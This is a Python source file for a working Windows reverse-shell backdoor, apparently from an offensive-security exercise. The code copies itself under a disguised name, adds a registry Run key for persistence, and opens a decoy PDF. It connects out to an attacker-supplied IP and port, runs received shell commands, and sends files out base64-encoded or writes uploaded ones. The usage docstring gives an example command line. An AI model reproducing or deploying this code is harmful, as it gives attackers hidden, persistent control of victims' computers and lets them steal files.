#!/usr/bin/env python

import argparse
import shutil
import socket
import subprocess
import json
import os
import base64
import sys

'''
        To run the reverse_backdoor.py, pass the arguments as shown below:

        e.g. python reverse_backdoor.py -e '\\Windows Explorer.exe' -r 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
        /v update /t REG_SZ /d "' -o '\mozilla.pdf' -i '192.168.100.210' -p 4444
        Each argument is represented by a single letter (e for evil-file, r for register-cmd, o for open-file, 
        i for IP, and p for port).  For each argument, you provide its value after the argument in the command line.
'''


class Backdoor:
    def __init__(self, ip, port, evil_file_location, register_cmd, open_file):
        self.evfl = evil_file_location
        self.reg_cmd = register_cmd
        self.open_file = open_file
        self.become_persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistence(self):
        if not os.path.exists(self.evfl):
            shutil.copyfile(sys.executable, self.evfl)
            subprocess.call(self.reg_cmd + self.evfl + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('latin-1')
                               if isinstance(data, bytes) else data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data += (self.connection.recv(1024)).decode('utf-8')
                return json.loads(json_data.encode('utf-8'))
            except ValueError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return '[+] Changing working directory to ' + path

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content.encode('utf-8')))
            return '[+] Upload successful.'

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(
                        command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as err:
                command_result = '[-] Error during command execution: ' + \
                    str(err)

            self.reliable_send(command_result)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Backdoor command line parameters.')
    parser.add_argument("-e", "--evil-file", required=True,
                        help="Evil file location")
    parser.add_argument("-r", "--register-cmd", required=True,
                        help="Register command")
    parser.add_argument("-o", "--open-file", required=True,
                        help="File to be opened")
    parser.add_argument("-i", "--ip", required=True,
                        help="IP address")
    parser.add_argument("-p", "--port", required=True,
                        type=int, help="Port number")

    args = parser.parse_args()

    # Open file
    subprocess.Popen(args.open_file, shell=True)

    try:
        my_backdoor = Backdoor(
            args.ip, args.port, args.evil_file, args.register_cmd, args.open_file)
        my_backdoor.run()
    except Exception as err:
        sys.exit()
